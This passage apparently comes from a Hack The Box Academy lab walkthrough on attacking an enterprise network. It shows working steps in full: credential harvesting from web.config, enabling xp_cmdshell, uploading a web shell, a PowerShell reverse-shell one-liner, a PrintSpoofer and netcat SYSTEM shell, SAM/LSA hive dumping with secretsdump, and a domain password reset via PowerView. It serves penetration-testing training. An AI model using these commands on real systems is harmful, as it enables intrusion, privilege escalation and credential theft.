root@dmz01:/tmp# cat DEV01/flag.txt

bf22a1d0acfca4af517e1417a80e92d1
```

However, students can also enumerate the NFS share further, to find the credentials `Administrator:D0tn31Nuk3R0ck$$@123` in the file "web.config" under the "DNN" directory, which will be used in the upcoming question:

Code: shell

```shell
cd DEV01
cat DNN/web.config
```

```shell-session
root@dmz01:/tmp# cd DEV01
root@dmz01:/tmp/DEV01# cat DNN/web.config 
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Answer: `bf22a1d0acfca4af517e1417a80e92d1`

# Exploitation & Privilege Escalation

## Question 1

### "Retrieve the contents of the SAM database on the DEV01 host. Submit the NT hash of the administrator user as your answer."

Using the SSH private key harvested previously, students need to connect to `STMIP` over SSH but also use Dynamic Port Forwarding to set up for pivoting (using port 9050 in here equates to not editing "proxychains.conf" to add another SOCKS4 proxy, since by default, `proxychains` has a SOCKS4 proxy entry that utilizes port 9050):

Code: shell

```shell
sudo ssh -D 9050 -i id_rsa root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo ssh -D 9050 -i id_rsa root@10.129.203.114

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Tue Sep  6 13:47:23 2022 from 10.10.14.171
root@dmz01:~#
```

Students will add a socks entry in `FoxyProxy` by clicking on the extension and `Options`:

![Attacking_Enterprise_Networks_Walkthrough_Image_79.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_79.png)

Subsequently, students will navigate to the `Proxies` tab and click `Add`:

![Attacking_Enterprise_Networks_Walkthrough_Image_80.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_80.png)

Students will set the `Title` to `Socks Proxy` for convenience, the `Type` to `SOCKS4`, the `Hostname` to `127.0.0.1`, and the `Port` to `9050`, and save the entry:

![Attacking_Enterprise_Networks_Walkthrough_Image_81.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_81.png)

Right after saving the entry, students will click on the extension and enable the `Socks Proxy`:

![Attacking_Enterprise_Networks_Walkthrough_Image_82.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_82.png)

Then, from `Pwnbox`/`PMVPN`, students need to run Firefox, proxying it through `proxychains`, and specifying the URL as the IP address 172.16.8.20:

Code: shell

```shell
proxychains firefox 172.16.8.20
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains firefox 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| detectportal.firefox.com

<SNIP>
```

![Attacking_Enterprise_Networks_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_48.png)

Students then need to click on the "Login" button found at the top right corner and use the credentials `Administrator:D0tn31Nuk3R0ck$$@123`, which were harvested from the previous question:

![Attacking_Enterprise_Networks_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_49.png)

Subsequently, students need to click on `Settings` then `SQL Console`:

![Attacking_Enterprise_Networks_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_50.png)

Students then need to enable `xp_cmdshell`:

Code: sql

```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

![Attacking_Enterprise_Networks_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_51.png)

Subsequently, students can test `xp_cmdshell` by running the `whoami` command:

![Attacking_Enterprise_Networks_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_52.png)

Now, students need to whitelist the extensions `asp,aspx,exe,SAVE` by editing "Allowable File Extensions":

![Attacking_Enterprise_Networks_Walkthrough_Image_53.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_53.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_54.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_54.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_55.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_55.png)

Students then need to navigate to the `/admin/file-management` web page on the website and upload the `newcmdasp.asp` web shell (which can be downloaded on `Pwnbox`/`PMVPN` from [GitHub](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp)):

![Attacking_Enterprise_Networks_Walkthrough_Image_56.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_56.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_57.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_57.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_58.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_58.png)

Students need to click on the uploaded file's icon to access it and test it out:

![Attacking_Enterprise_Networks_Walkthrough_Image_59.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_59.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_60.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_60.png)

With the web shell successfully working, students now need to attain a reverse shell through a PowerShell one-liner, however, before that, students need to initiate a new SSH connection to the root user on `STMIP` (i.e., `DMZ01`) and then start an `nc` listener on a port (9999 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
root@dmz01:~# nc -nvlp 9999

Listening on 0.0.0.0 9999
```

Subsequently, students need to know the IP address of the interface that is connected to the `172.16.0.0/16` network, which is named `ens192` on `DMZ01`:

Code: shell

```shell
ip a show ens192 | grep "inet" -m 1
```

```shell-session
root@dmz01:~# ip a show ens192 | grep "inet" -m 1

	inet 172.16.8.120/16 brd 172.16.255.255 scope global ens192
```

Then, using `newaspcmd.asp` from within `DNN` in the proxy-ed FireFox, students need to execute the following PowerShell reverse shell command:

Code: powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![Attacking_Enterprise_Networks_Walkthrough_Image_61.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_61.png)

On the `nc` listener, students will receive the callback, establishing the reverse-shell connection successfully:

```powershell-session
root@dmz01:~# nc -nvlp 9999

Listening on 0.0.0.0 9999
Connection received on 172.16.8.20 50505
whoami

iis apppool\dotnetnukeapppool
PS C:\windows\system32\inetsrv>
```

Thereafter, students need to use `DNN` again to upload [nc.exe](https://github.com/int0x33/nc.exe/raw/master/nc.exe) and [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). To do so, students need to download the executables on `Pwnbox`/`STMIP`:

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2022-09-07 06:33:27--  https://github.com/int0x33/nc.exe/raw/master/nc.exe

<SNIP>

nc.exe                                  100%[=============================================================================>]  37.71K  --.-KB/s    in 0s      

2022-09-07 06:33:27 (87.0 MB/s) - ‘nc.exe’ saved [38616/38616]

┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
--2022-09-07 05:15:05--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

Resolving github.com (github.com)... 140.82.121.3

<SNIP>

PrintSpoofer64.exe           100%[============================================>]  26.50K  --.-KB/s    in 0.001s  

2022-09-07 05:15:06 (49.9 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
```

Afterward, students can upload the two executables via `DNN`:

![Attacking_Enterprise_Networks_Walkthrough_Image_62.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_62.png)

Students then need to start another `nc` listener on a port (9999 used in here) on the root user on `STMIP` (i.e., `DMZ01`) which will catch a system shell once `PrintSpoofer64.exe` runs:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
root@dmz01:~# nc -nvlp 9999

Listening on 0.0.0.0 9999
```

Then, using the reverse shell attained from the PowerShell reverse shell one-liner, students need to run the following command to execute `PrintSpoofer64` and catch a shell as `NT AUTHORITY\SYSTEM`:

Code: powershell

```powershell
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 9999 -e cmd"
```

```shell-session
PS C:\windows\system32\inetsrv> c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 9999 -e cmd"

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

On the `nc` port 9999 listener, the callback will appear and the reverse shell connection will be established:

```shell-session
root@dmz01:~# nc -nvlp 9999

Listening on 0.0.0.0 9999
Connection received on 172.16.8.20 50266
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

nt authority\system
```

Thereafter, students need to change directories to `C:\DotNetNuke\Portals\0\` to save copies of the SAM database registry hives within it:

Code: cmd

```cmd
cd c:\dotnetnuke\portals\0\
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```

```shell-session
C:\Windows\System32>cd c:\dotnetnuke\portals\0\

c:\DotNetNuke\Portals\0>reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE
The operation completed successfully.

c:\DotNetNuke\Portals\0>reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
The operation completed successfully.

c:\DotNetNuke\Portals\0>reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE
The operation completed successfully.
```

Now, students need to download the three `.SAVE` files via `DNN`, one by one:

![Attacking_Enterprise_Networks_Walkthrough_Image_63.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_63.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_64.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_64.png)

Once successfully downloaded to `Pwnbox`/`PMVPN`, students need to use `secretsdump.py`, utilizing all three files as input to the tool's options, to find that the NT hash of the Administrator user is `0e20798f695ab0d04bc138b22344cea8`:

Code: shell

```shell
secretsdump.py LOCAL -system ~/Downloads/SYSTEM.SAVE -sam ~/Downloads/SAM.SAVE -security ~/Downloads/SECURITY.SAVE
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ secretsdump.py LOCAL -system ~/Downloads/SYSTEM.SAVE -sam ~/Downloads/SAM.SAVE -security ~/Downloads/SECURITY.SAVE

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:1f6c9b531cb2c6fca8bbe3109f41a5e2aa979ff5c551b43bf0b9b3cee72b613960ca38bb89092a676a185863d57023ccab616c45e1bc1bf732c0ff44f2b17cce55386d062f29e5b80ec1ab3bb25142ce09ded31687dc25ab4a958e341e3bf9006eb28359e4e3af3d277080020cbaebde32f2ae4f346a1d03d61d2089fde3db6f238bde091740dc9b09833e94a058f296210e6f14707a99fb071069d122938d0f1b5bb7b111304b28cd97134e92e22d886034f3c4b5c11bfba322a689c1f975222d9ca31ab427d0c3add20ca6165a82e819ccfeb25086aaaba185b235402b514efdc27269343e9b7db2971ce1fd489850
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c3b0b7a4f728a0573287125564e7efa6
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

Answer: `0e20798f695ab0d04bc138b22344cea8`

# Exploitation & Privilege Escalation

## Question 2

### "Escalate privileges on the DEV01 host. Submit the contents of the flag.txt file on the Administrator Desktop."

Using the same system shell session established in the previous question, students can print out the contents of the flag file "flag.txt", which can be found under the directory `C:\Users\Administrator\Desktop\flag.txt`, finding it to be `K33p_0n_sp00fing!`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

```cmd-session
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt

K33p_0n_sp00fing!
```

Answer: `K33p_0n_sp00fing!`

# Lateral Movement

## Question 1

### "Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer."

Using the SSH private key harvested previously, students need to connect to `STMIP` (i.e., `DMZ01`) over SSH and set a local port forward to setup for RDP connection (students can choose the port number, 1337 is used here):

Code: shell

```shell
ssh -i id_rsa -L PWNPO:172.16.8.20:3389 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa -L 1337:172.16.8.20:3389 root@10.129.97.1

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Wed Sep  7 05:10:22 2022 from 10.10.14.171
root@dmz01:~#
```

Subsequently, students need to establish an additional SSH connection using Dynamic Port Forwarding so that `proxychains` can be used afterward:

Code: shell

```shell
ssh -i id_rsa -D 9050 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa -D 9050 root@10.129.203.114

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Wed Sep  7 22:03:18 2022 from 10.10.15.8
root@dmz01:~#
```

Students then need to use `xfreerdp` on 127.0.0.1 and `PWNPO` that was specified in the set local port forward, supply the credentials `hporter:Gr8hambino!` (which were found by dumping LSA secrets in Question 1 of `Exploitation & Privilege Escalation`), and redirect the directory where tools like `PowerView.ps1` and `Snaffler` (in here, the name of the home directory of `Pwnbox` is used, i.e., `/home/htb-ac413848`, students can attain theirs by running the `pwd` command in the landing directory of `Pwnbox`) will be available to get copied to the named share on `STMIP` (in here named "home"):

Code: shell

```shell
xfreerdp /v:127.0.0.1:PWNPO /u:hporter /p:Gr8hambino! /drive:home,$(pwd)
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:127.0.0.1:1337 /u:hporter /p:Gr8hambino! /drive:home,$(pwd)

[00:05:57:587] [3252:3253] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[00:05:57:588] [3252:3253] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[00:05:57:588] [3252:3253] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[00:05:57:588] [3252:3253] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>

[00:07:46:616] [3252:3253] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 127.0.0.1:1337 (RDP-Server):
	Common Name: ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
	Thumbprint:  9e:f2:ac:ac:04:b1:54:80:73:6e:0f:c5:b9:d5:c9:61:0d:65:96:4b:e7:06:44:d6:8d:55:40:7c:68:3f:5b:04
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![Attacking_Enterprise_Networks_Walkthrough_Image_65.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_65.png)

Once successfully connected to the Windows target (`xfreerdp` might seem to to be hanging, however, it is not but takes some time), students need to change directories to `C:\Share`, and use the `net use` command to see the path to the mapped drive:

Code: cmd

```cmd
cd C:\Share
net use
```

```cmd-session
C:\Users\hporter>cd C:\Share

C:\Share>net use

New connections will be remembered.

Status       Local     Remote                    Network
-------------------------------------------------------------------------------
						\\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.
```

Once the path is known, students then need to download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) and [Snaffler](https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe) on `Pwnbox`/`PMVPN` in the directory that they have mapped to `\home` in the spawned Windows target (`/home/htb-ac413848` in here):

Code: shell

```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

--2022-09-08 00:12:16--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

<SNIP>

Saving to: ‘PowerView.ps1’
PowerView.ps1                           100%[=============================================================================>] 752.23K  --.-KB/s    in 0.004s  

2022-09-08 00:12:17 (187 MB/s) - ‘PowerView.ps1’ saved [770279/770279]

┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe

--2022-09-08 00:14:08--  https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe

<SNIP>

Saving to: ‘Snaffler.exe’
Snaffler.exe                            100%[=============================================================================>] 468.50K  --.-KB/s    in 0.003s  

2022-09-08 00:14:08 (140 MB/s) - ‘Snaffler.exe’ saved [479744/479744]
```

Once downloaded successfully, students need to copy them over to the named share "home" using the `copy` command:

Code: cmd

```cmd
copy \\TSCLIENT\home\PowerView.ps1
copy \\TSCLIENT\home\Snaffler.exe
```

```cmd-session
C:\Share>copy \\TSCLIENT\home\PowerView.ps1
	1 file(s) copied.

C:\Share>copy \\TSCLIENT\home\Snaffler.exe
	1 file(s) copied.
```

Students now need to import the `PowerView` module and change the password of the `ssmalls` user (students should know about this user from the section's reading, as the data collected from `SharpHound` was analyzed with `BloodHound`). To do so, students first need to drop into a `PowerShell` session then import the `PowerView.ps1` module:

Code: powershell

```powershell
powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Pwned123' -AsPlainText -Force) -Verbose
```

```powershell-session
C:\Share>powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Share> Import-Module .\PowerView.ps1
PS C:\Share> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Pwned123' -AsPlainText -Force) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

Then, students need to run `Snaffler`, to notice from its output that there is a share of the name "Department Shares":

Code: shell

```shell
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```powershell-session
PS C:\Share> .\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
	 by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Black}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$>()
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Green}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$>(R) Remote Admin
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Black}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$>()
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Green}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$>(R) Default share
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\NETLOGON>(R) Logon server share
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:09Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\SYSVOL>(R) Logon server share
[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2022-09-08 01:16:10Z [File] {Red}<KeepCmdCredentials|R|passwo?r?d\s*=\s*[\'\"][^\'\"]....|32.1kB|2022-06-01 18:34:39Z>(\\DC01.INLANEFREIGHT.LOCAL\NETLOGON\adum.vbs) st\ likely\ not\ needed,\ but\ if\ needed\ to\ pass\ authorization\ for\ connecting\ and\ sending\ emails\r\nConst\ cdoUserName\ =\ "account@inlanefreight\.local"\t'EMAIL\ -\ USERNAME\ -\ IF\ AUTHENTICATION\ REQUIRED\r\nConst\ cdoPassword\ =\ "L337\^p@\$\$w0rD"\t\t\t'EMAIL\ -\ PASSWORD\ -\ IF\ AUTHENTICATION\ REQUIRED\r\n\r\n''\ Path\ information\ specific\ to\ the\ machine\ running\ on\.\ \r\nDim\ \ \ cPath:\ cPath\ =\ "\."\t\t\t\t\t'WHERE\ ARE\ THE\ INPUT\ /\ OUTPUT\ FILE

<SNIP>
```

Thereon, students need to use `crackmapexec` (on `Pwnbox`, students need to switch users to root to be able to use `crackmapexec`) to enumerate the "Department Shares" share, proxying through `proxychains`:

Code: shell

```shell
sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Pwned123 -M spider_plus --share 'Department Shares'
```

```shell-session
┌─[root@pwnbox-base]─[~]
└──╼ # sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Pwned123 -M spider_plus --share 'Department Shares'

ProxyChains-3.1 (http://proxychains.sf.net)
/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:135-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Pwned123 
SPIDER_P... 172.16.8.3      445    DC01             [*] Started spidering plus with option:
SPIDER_P... 172.16.8.3      445    DC01             [*]        DIR: ['print$']
SPIDER_P... 172.16.8.3      445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.8.3      445    DC01             [*]       SIZE: 51200
SPIDER_P... 172.16.8.3      445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

After `crackmapexec` finishes enumerating the share, students need to print the JSON file `/tmp/cme_spider_plus/172.16.8.3.json` and investigate the files that were discovered:

Code: shell

```shell
cat /tmp/nxc_hosted/nxc_spider_plus/172.16.8.3.json
```

```shell-session
┌─[root@pwnbox-base]─[~]
└──╼ # cat /tmp/nxc_hosted/nxc_spider_plus/172.16.8.3.json

{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 19:34:16",
            "ctime_epoch": "2022-06-01 19:34:16",
            "mtime_epoch": "2022-06-01 19:35:16",
            "size": "3.91 KB"
        }
    },

<SNIP>

}
```

The first file, `SQL Express Backup.ps1`, seems the most promising, thus, from `Pwnbox`/`PMVPN`, students need to connect to the "Departments Share" on 172.16.8.3 (proxying through `proxychains`) and download the PowerShell script:

Code: shell

```shell
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
get IT\Private\Development\"SQL Express Backup.ps1"
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.

<SNIP>

smb: \> get IT\Private\Development\"SQL Express Backup.ps1"

getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as IT\Private\Development\SQL Express Backup.ps1 (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
```

After downloading the PowerShell script successfully, students need to print its contents out to find the password `!qazXSW@`:

Code: shell

```shell
cat IT\\Private\\Development\\SQL\ Express\ Backup.ps1
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat IT\\Private\\Development\\SQL\ Express\ Backup.ps1

<SNIP>

